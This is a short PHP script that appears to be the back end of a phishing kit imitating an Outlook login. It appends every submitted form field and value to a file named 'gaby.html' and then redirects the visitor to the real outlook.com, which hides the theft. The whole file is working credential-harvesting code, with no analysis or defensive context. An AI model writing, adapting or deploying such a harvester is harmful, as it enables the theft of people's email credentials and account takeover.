<?php
header("Location: https://www.outlook.com");
$handle = fopen("gaby.html", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br/>");
}
fwrite($handle, "<b>=====================================================<b>");
fwrite($handle, "<br/>");
fclose($handle);
exit;
?>

